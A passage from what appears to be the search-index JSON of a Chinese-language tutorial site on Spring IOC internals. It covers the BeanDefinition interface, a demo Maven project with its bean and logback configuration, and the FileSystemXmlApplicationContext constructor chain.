#ROLE_SUPPORT\n     * @see #ROLE_INFRASTRUCTURE\n     */\n    void setRole(int role);\n\n    /**\n     * Get the role hint for this {@code BeanDefinition}. The role hint\n     * provides the frameworks as well as tools with an indication of\n     * the role and importance of a particular {@code BeanDefinition}.\n     * @see #ROLE_APPLICATION\n     * @see #ROLE_SUPPORT\n     * @see #ROLE_INFRASTRUCTURE\n     */\n    int getRole();\n\n    /**\n     * Set a human-readable description of this bean definition.\n     * @since 5.1\n     */\n    void setDescription(@Nullable String description);\n\n    /**\n     * Return a human-readable description of this bean definition.\n     */\n    @Nullable\n    String getDescription();\n\n\n    // Read-only attributes\n\n    /**\n     * Return a resolvable type for this bean definition,\n     * based on the bean class or other specific metadata.\n     * &lt;p&gt;This is typically fully resolved on a runtime-merged bean definition\n     * but not necessarily on a configuration-time definition instance.\n     * @return the resolvable type (potentially {@link ResolvableType#NONE})\n     * @since 5.2\n     * @see ConfigurableBeanFactory#getMergedBeanDefinition\n     */\n    ResolvableType getResolvableType();\n\n    /**\n     * Return whether this a &lt;b&gt;Singleton&lt;/b&gt;, with a single, shared instance\n     * returned on all calls.\n     * @see #SCOPE_SINGLETON\n     */\n    boolean isSingleton();\n\n    /**\n     * Return whether this a &lt;b&gt;Prototype&lt;/b&gt;, with an independent instance\n     * returned for each call.\n     * @since 3.0\n     * @see #SCOPE_PROTOTYPE\n     */\n    boolean isPrototype();\n\n    /**\n     * Return whether this bean is \"abstract\", that is, not meant to be instantiated.\n     */\n    boolean isAbstract();\n\n    /**\n     * Return a description of the resource that this bean definition\n     * came from (for the purpose of showing context in case of errors).\n     */\n    @Nullable\n    String getResourceDescription();\n\n    /**\n     * Return the originating BeanDefinition, or {@code null} if none.\n     * Allows for retrieving the decorated bean definition, if any.\n     * &lt;p&gt;Note that this method returns the immediate originator. Iterate through the\n     * originator chain to find the original BeanDefinition as defined by the user.\n     */\n    @Nullable\n    BeanDefinition getOriginatingBeanDefinition();\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#beandefination_1","title":"BeanDefination\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface BeanDefinition extends AttributeAccessor, BeanMetadataElement {\n\n    String SCOPE_SINGLETON = ConfigurableBeanFactory.SCOPE_SINGLETON;\n\n    String SCOPE_PROTOTYPE = ConfigurableBeanFactory.SCOPE_PROTOTYPE;\n\n    int ROLE_APPLICATION = 0;\n\n\n    int ROLE_SUPPORT = 1;\n\n    // infrastructure\n    int ROLE_INFRASTRUCTURE = 2;\n\n\n    // Modifiable attributes\n\n    void setParentName(@Nullable String parentName);\n\n\n    @Nullable\n    String getParentName();\n\n\n    void setBeanClassName(@Nullable String beanClassName);\n\n\n    @Nullable\n    String getBeanClassName();\n\n\n    void setScope(@Nullable String scope);\n\n\n    @Nullable\n    String getScope();\n\n\n    void setLazyInit(boolean lazyInit);\n\n\n    boolean isLazyInit();\n\n\n    void setDependsOn(@Nullable String... dependsOn);\n\n\n    @Nullable\n    String[] getDependsOn();\n\n\n    void setAutowireCandidate(boolean autowireCandidate);\n\n\n    boolean isAutowireCandidate();\n\n\n    void setPrimary(boolean primary);\n\n\n    boolean isPrimary();\n\n\n    void setFactoryBeanName(@Nullable String factoryBeanName);\n\n\n    @Nullable\n    String getFactoryBeanName();\n\n\n    void setFactoryMethodName(@Nullable String factoryMethodName);\n\n\n    @Nullable\n    String getFactoryMethodName();\n\n\n    ConstructorArgumentValues getConstructorArgumentValues();\n\n\n    default boolean hasConstructorArgumentValues() {\n        return !getConstructorArgumentValues().isEmpty();\n    }\n\n\n    MutablePropertyValues getPropertyValues();\n\n\n    default boolean hasPropertyValues() {\n        return !getPropertyValues().isEmpty();\n    }\n\n\n    void setInitMethodName(@Nullable String initMethodName);\n\n    @Nullable\n    String getInitMethodName();\n\n\n    void setDestroyMethodName(@Nullable String destroyMethodName);\n\n\n    @Nullable\n    String getDestroyMethodName();\n\n\n    void setRole(int role);\n\n\n    int getRole();\n\n\n    void setDescription(@Nullable String description);\n\n    @Nullable\n    String getDescription();\n\n\n    // Read-only attributes\n\n\n    ResolvableType getResolvableType();\n\n\n    boolean isSingleton();\n\n\n    boolean isPrototype();\n\n\n    boolean isAbstract();\n\n\n    @Nullable\n    String getResourceDescription();\n\n\n    @Nullable\n    BeanDefinition getOriginatingBeanDefinition();\n\n}\n\n\n\n// org.springframework.core.AttributeAccessor\npackage org.springframework.core;\npublic interface AttributeAccessor {\n\n    void setAttribute(String name, @Nullable Object value);\n\n\n    @Nullable\n    Object getAttribute(String name);\n\n\n    @Nullable\n    Object removeAttribute(String name);\n\n\n    boolean hasAttribute(String name);\n\n\n    String[] attributeNames();\n\n}\n\n\n\n// org.springframework.beans.BeanMetadataElemen\npackage org.springframework.beans;\npublic interface BeanMetadataElement {\n\n    @Nullable\n    default Object getSource() {\n        return null;\n    }\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#2demo","title":"2.\u200b\u4ece\u200b\u4e00\u4e2a\u200bDemo\u200b\u7a0b\u5e8f\u200b\u5f00\u59cb","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#21-demo","title":"2.1 Demo\u200b\u9879\u76ee\u200b\u914d\u7f6e","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#mavenpomxml","title":"maven\u200b\u7684\u200bpom.xml\u200b\u914d\u7f6e\u6587\u4ef6","text":"XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n    &lt;!--        &lt;parent&gt;--&gt;\n    &lt;!--            &lt;groupId&gt;com.acanx&lt;/groupId&gt;--&gt;\n    &lt;!--            &lt;artifactId&gt;ACANX-JavaEE-Dependencies&lt;/artifactId&gt;--&gt;\n    &lt;!--            &lt;version&gt;0.0.1&lt;/version&gt;--&gt;\n    &lt;!--        &lt;/parent&gt;--&gt;\n\n    &lt;groupId&gt;com.acanx&lt;/groupId&gt;\n    &lt;artifactId&gt;JavaWeb-Spring&lt;/artifactId&gt;\n    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\n    &lt;packaging&gt;war&lt;/packaging&gt;\n\n    &lt;name&gt;JavaWeb-Spring&lt;/name&gt;\n    &lt;description&gt;JavaWeb-Spring project&lt;/description&gt;\n\n\n    &lt;properties&gt;\n        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;\n        &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;\n        &lt;java.version&gt;11&lt;/java.version&gt;\n        &lt;spring.version&gt;5.2.1.RELEASE&lt;/spring.version&gt;\n        &lt;!-- log4j\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\u7ba1\u7406\u200b\u5305\u200b\u7248\u672c\u200b --&gt;\n        &lt;slf4j.version&gt;2.0.0-alpha1&lt;/slf4j.version&gt;\n        &lt;logback.version&gt;1.3.0-alpha5&lt;/logback.version&gt;\n        &lt;!-- log4j\u200b\u65e5\u5fd7\u200b\u5305\u200b\u7248\u672c\u53f7\u200b --&gt;\n        &lt;log4j2.version&gt;2.8.2&lt;/log4j2.version&gt;\n        &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt;\n        &lt;junit.version&gt;4.12&lt;/junit.version&gt;\n        &lt;fastjson.version&gt;1.2.62&lt;/fastjson.version&gt;\n        &lt;maven-compiler-plugin.version&gt;3.8.1&lt;/maven-compiler-plugin.version&gt;\n    &lt;/properties&gt;\n\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;\n            &lt;version&gt;${spring.version}&lt;/version&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;\n            &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;\n            &lt;version&gt;${logback.version}&lt;/version&gt;\n        &lt;/dependency&gt;\n        &lt;!-- \u200b\u6dfb\u52a0\u200bfastjson --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;\n            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;\n            &lt;version&gt;${fastjson.version}&lt;/version&gt;\n        &lt;/dependency&gt;\n        &lt;!--  \u200b\u5355\u5143\u6d4b\u8bd5\u200b--&gt;\n        &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;junit&lt;/groupId&gt;\n            &lt;artifactId&gt;junit&lt;/artifactId&gt;\n            &lt;version&gt;${junit.version}&lt;/version&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n\n    &lt;/dependencies&gt;\n\n    &lt;build&gt;\n        &lt;plugins&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\n                &lt;version&gt;${maven-compiler-plugin.version}&lt;/version&gt;\n                &lt;configuration&gt;\n                    &lt;target&gt;11&lt;/target&gt;\n                    &lt;source&gt;11&lt;/source&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;\n&lt;/project&gt;\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#22-demo","title":"2.2 Demo\u200b\u7a0b\u5e8f","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#221","title":"2.2.1\u200b\u542f\u52a8\u200b\u7c7b","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:com.acanx.spring.xml.CspringIocConfigByFileSystemXmlApplicationContext.java Java<pre><code>package com.acanx.spring.xml;\n\nimport com.acanx.spring.bean.Car;\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.support.FileSystemXmlApplicationContext;\n\n/**\n * ACANX-JavaWeb / com.acanx.spring.xml / SpringIocConfigByXmlFileInClassPath.java\n * \u200b\u6587\u4ef6\u200b\u7531\u200b ACANX \u200b\u521b\u5efa\u200b\u4e8e\u200b 2019/7/30 - 13:39\n * Description  SpringIocConfigByXmlFileInClassPath:\n * \u200b\u8865\u5145\u200b\u8bf4\u660e\u200b\uff1a \u200b\u4f7f\u7528\u200bFileSystemXmlApplicationContext\u200b\u52a0\u8f7d\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0b\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\n *\n * @author ACANX\n * @version 0.0.1.0\n * @date 2019/7/30  13:39\n * @since 0.0.1-SNAPSHOT\n */\npublic class CspringIocConfigByFileSystemXmlApplicationContext {\n   private static final Logger logger= LoggerFactory.getLogger(CspringIocConfigByFileSystemXmlApplicationContext.class);\n   public static void main(String[] args)  {\n        logger.info(\"-------------------\");\n        logger.info(System.getProperty(\"org.apache.commons.logging.LogFactory\"));\n        logger.info(System.getProperty(\"org.apache.commons.logging.Log\"));\n        logger.info(\"-------------------\");\n        String location=\"D:\\\\ProgramCode\\\\JavaCode\\\\ACANX-JavaWeb\\\\JavaWeb-Spring\\\\ApplicationContextC.xml\";\n        ApplicationContext applicationContext = new FileSystemXmlApplicationContext(location);\n        Car car = (Car) applicationContext.getBean(\"myCar\");\n        logger.info(car.toString());\n        logger.info(\"Info :{}\",logger.isInfoEnabled());\n        String[] beanNames=applicationContext.getBeanDefinitionNames();\n        for (String beanName:beanNames) {\n             logger.info(beanName+\"::::: \"+applicationContext.getBean(beanName).toString());\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#222bena","title":"2.2.2\u200b\u4f7f\u7528\u200b\u5230\u200b\u7684\u200bBena\u200b\u5bf9\u8c61","text":"Java<pre><code>package com.acanx.spring.bean;\n\npublic class Car {\n\n    private  String name;\n\n    private  String price;\n\n    // get set \u200b\u9ed8\u8ba4\u200b\u6784\u9020\u65b9\u6cd5\u200b\u5df2\u200b\u7701\u7565\u200b\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#223-springcontextxmlapplicationcontextcxml","title":"2.2.3 springContext\u200b\u7684\u200bxml\u200b\u6587\u4ef6\u200bApplicationContextC.xml","text":"XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt;\n\n    &lt;bean name=\"myCar\" class=\"com.acanx.spring.bean.Car\" &gt;\n        &lt;property name=\"name\" value=\"QQAI\"/&gt;\n        &lt;property name=\"price\" value=\"2222\"/&gt;\n    &lt;/bean&gt;\n\n&lt;/beans&gt;\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#224-logbackxmlresources","title":"2.2.4 \u200b\u914d\u7f6e\u200b\u65e5\u5fd7\u200b logback.xml\uff08resources\u200b\u6587\u4ef6\u5939\u200b\u4e0b\u200b\uff09","text":"XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration scan=\"true\" scanPeriod=\"60 seconds\" debug=\"false\"&gt;\n\n    &lt;property name=\"LOG_PATH\" value=\".log\"/&gt;\n    &lt;property name=\"APP_NAME\" value=\"IOCDemo\"/&gt;\n    &lt;!--\u200b\u8bbe\u7f6e\u200b\u7cfb\u7edf\u65e5\u5fd7\u200b\u76ee\u5f55\u200b--&gt;\n    &lt;property name=\"APP_DIR\" value=\"app-IOCDemo\"/&gt;\n\n    &lt;property name=\"CONSOLE_LOG_PATTERN\" value=\"[CLP]${CONSOLE_LOG_PATTERN:-%clr(%d{${LOG_DATEFORMAT_PATTERN:-yyyy-MM-dd HH:mm:ss.SSS}}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %clr(%-40.40logger{39}){cyan} %clr(%-15.15method){cyan} %clr([%4.4line{4}]){magenta} %clr(:){faint} %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}\"/&gt;\n    &lt;property name=\"FILE_LOG_PATTERN\" value=\"${FILE_LOG_PATTERN:-%d{${LOG_DATEFORMAT_PATTERN:-yyyy-MM-dd HH:mm:ss.SSS}} ${LOG_LEVEL_PATTERN:-%5p} ${PID:- } --- [%t] %-40.40logger{39} : %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}\"/&gt;\n    &lt;property name=\"CONSOLE_LOGBACK_PATTERN\" value=\"[\u200b\u63a7\u5236\u53f0\u200b] %d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level | %-80logger # %-40M [%4line] : %msg%n\"/&gt;\n\n\n    &lt;contextName&gt;logback&lt;/contextName&gt;\n    &lt;!--\u200b\u8f93\u51fa\u200b\u5230\u200b\u63a7\u5236\u53f0\u200b--&gt;\n    &lt;appender name=\"CONSOLE\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;TRACE&lt;/level&gt;\n        &lt;/filter&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n        &lt;encoder&gt;\n            &lt;!--  \u200b\u6587\u4ef6\u540d\u200b [%file]--&gt;\n            &lt;pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/pattern&gt;\n        &lt;/encoder&gt;\n    &lt;/appender&gt;\n\n    &lt;appender name=\"ERROR_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;ERROR&lt;/level&gt;\n            &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;\n            &lt;onMismatch&gt;DENY&lt;/onMismatch&gt;\n        &lt;/filter&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-ERROR.log&lt;/File&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/server-error-%d{yyyyMMdd}.log.%i\n            &lt;/fileNamePattern&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n    &lt;/appender&gt;\n\n\n    &lt;appender name=\"WARN_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;WARN&lt;/level&gt;\n            &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;\n            &lt;onMismatch&gt;DENY&lt;/onMismatch&gt;\n        &lt;/filter&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-WARN.log&lt;/File&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/ACANX-JavaWeb/server-WARN-%d{yyyyMMdd}.log.%i\n            &lt;/fileNamePattern&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n    &lt;/appender&gt;\n\n    &lt;appender name=\"INFO_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-INFO.log&lt;/File&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;INFO&lt;/level&gt;\n            &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;\n            &lt;onMismatch&gt;DENY&lt;/onMismatch&gt;\n        &lt;/filter&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/ACANX-JavaWeb/server-info-%d{yyyyMMdd}.log.%i&lt;/fileNamePattern&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n        &lt;encoder class=\"ch.qos.logback.classic.encoder.PatternLayoutEncoder\"&gt;\n            &lt;!--\u200b\u683c\u5f0f\u5316\u200b\u8f93\u51fa\u200b\uff1a%d\u200b\u8868\u793a\u200b\u65e5\u671f\u200b\uff0c%thread\u200b\u8868\u793a\u200b\u7ebf\u7a0b\u200b\u540d\u200b\uff0c%-5level\uff1a\u200b\u7ea7\u522b\u200b\u4ece\u200b\u5de6\u200b\u663e\u793a\u200b5\u200b\u4e2a\u5b57\u7b26\u200b\u5bbd\u5ea6\u200b%msg\uff1a\u200b\u65e5\u5fd7\u200b\u6d88\u606f\u200b\uff0c%n\u200b\u662f\u200b\u6362\u884c\u7b26\u200b--&gt;\n            &lt;pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/pattern&gt;\n        &lt;/encoder&gt;\n    &lt;/appender&gt;\n\n    &lt;appender name=\"TRACE_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;TRACE&lt;/level&gt;\n            &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;\n            &lt;onMismatch&gt;DENY&lt;/onMismatch&gt;\n        &lt;/filter&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-TRACE.log&lt;/File&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/ACANX-JavaWeb/server-TRACE-%d{yyyyMMdd}.log.%i\n            &lt;/fileNamePattern&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n    &lt;/appender&gt;\n\n    &lt;appender name=\"FULL_LEVEL_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-FULL.log&lt;/File&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;TRACE&lt;/level&gt;\n        &lt;/filter&gt;\n        &lt;encoder&gt;\n            &lt;!--  \u200b\u6587\u4ef6\u540d\u200b [%file] --&gt;\n            &lt;pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/pattern&gt;\n        &lt;/encoder&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/ACANX-JavaWeb/LOG-FULL-%d{yyyyMMdd}.log.%i&lt;/fileNamePattern&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n    &lt;/appender&gt;\n\n    &lt;root level=\"TRACE\" additivity=\"true\"&gt;\n        &lt;appender-ref ref=\"CONSOLE\"/&gt;\n        &lt;appender-ref ref=\"WARN_FILE\"/&gt;\n        &lt;appender-ref ref=\"ERROR_FILE\"/&gt;\n        &lt;appender-ref ref=\"INFO_FILE\"/&gt;\n        &lt;appender-ref ref=\"TRACE_FILE\"/&gt;\n        &lt;appender-ref ref=\"FULL_LEVEL_FILE\"/&gt;\n    &lt;/root&gt;\n\n    &lt;!-- TRACE, DEBUG, INFO, WARN, ERROR, ALL \u200b\u548c\u200b OFF --&gt;\n    &lt;logger name=\"org\" level=\"TRACE\" additivity=\"true\"&gt;&lt;/logger&gt;\n    &lt;logger name=\"org.springframework.context\" level=\"TRACE\" additivity=\"false\"&gt;&lt;/logger&gt;\n    &lt;logger name=\"org.apache\" level=\"TRACE\"/&gt;\n    &lt;logger name=\"com.alibaba\" level=\"TRACE\"/&gt;\n    &lt;!-- \u200b\u5982\u679c\u200b\u8fd9\u91cc\u200b\u8bbe\u7f6e\u200b\u4e86\u200badditivity=true \u200b\u4ee3\u7801\u200b\u6253\u5370\u4fe1\u606f\u200b\u5411\u4e0a\u200b\u4f20\u9012\u200b,\u200b\u5c06\u200b\u6253\u5370\u4fe1\u606f\u200b\u4f20\u9012\u200b\u5230\u200broot \uff0c\u200b\u5e76\u4e14\u200b\u81ea\u5df1\u200b\u7684\u200bappender-ref \u200b\u4e5f\u200b\u4f1a\u200b\u6253\u5370\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u662f\u200b\u6253\u5370\u200b\u4e86\u200b\u4fe9\u200b\u6b21\u200b\u65e5\u5fd7\u200b--&gt;\n&lt;/configuration&gt;\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#3spring-ioc","title":"3.Spring IOC\u200b\u5bb9\u5668\u200b\u7684\u200b\u521b\u5efa","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#31-filesystemxmlapplicationcontextabstractxmlapplicationcontext","title":"3.1 \u200b\u8fdb\u5165\u200bFileSystemXmlApplicationContext\uff08AbstractXmlApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u7c7b\u200b\uff09","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b: org.springframework.context.support.FileSystemXmlApplicationContext.java Java<pre><code>    public FileSystemXmlApplicationContext(String configLocation) throws BeansException {\n        this(new String[] {configLocation}, true, null);\n    }\n\n\n    // \u200b\u4e0a\u9762\u200b\u7684\u200bthis \u200b\u6765\u5230\u200b\u4e0b\u9762\u200b\u7684\u200b\u91cd\u8f7d\u200b\u6784\u9020\u65b9\u6cd5\u200b\n    public FileSystemXmlApplicationContext(\n            String[] configLocations, boolean refresh, @Nullable ApplicationContext parent)\n            throws BeansException {\n\n        super(parent);  // \u200b\u521d\u59cb\u5316\u200b\u7236\u200b\u5bb9\u5668\u200bAbstractApplicationContext\n        setConfigLocations(configLocations); // \u200b\u8bbe\u7f6e\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\u7684\u200b\u4f4d\u7f6e\u200b\n        if (refresh) {\n            refresh();// \u200b\u6838\u5fc3\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9a\u4e49\u200b\u5728\u200b\u8d85\u7c7b\u200bAbstractApplicationContext\uff08\u200b\u62bd\u8c61\u7c7b\u200b\uff09\u200b\u4e2d\u200b\uff0c\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6a21\u677f\u200b\u65b9\u6cd5\u200b\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#32-abstractapplicationcontext","title":"3.2 \u200b\u521d\u59cb\u5316\u200b\u7236\u200b\u5bb9\u5668\u200bAbstractApplicationContext","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#321-abstractxmlapplicationcontextfilesystemxmlapplicationcontext","title":"3.2.1 AbstractXmlApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\uff08FileSystemXmlApplicationContext\u200b\u7684\u200b\u7236\u7c7b\u200b\uff09","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b: org.springframework.context.support.AbstractXmlApplicationContext.java Java<pre><code>    public AbstractXmlApplicationContext(@Nullable ApplicationContext parent) {\n        super(parent);\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#322-abstractrefreshableconfigapplicationcontext-abstractxmlapplicationcontext","title":"3.2.2 AbstractRefreshableConfigApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\uff08 AbstractXmlApplicationContext\u200b\u7684\u200b\u7236\u7c7b\u200b\uff09","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractRefreshableConfigApplicationContext.java Java<pre><code>    public AbstractRefreshableConfigApplicationContext(@Nullable ApplicationContext parent) {\n        super(parent);\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#323-abstractrefreshableapplicationcontext","title":"3.2.3 AbstractRefreshableApplicationContext\u200b\u62bd\u8c61\u7c7b","text":"<ul> 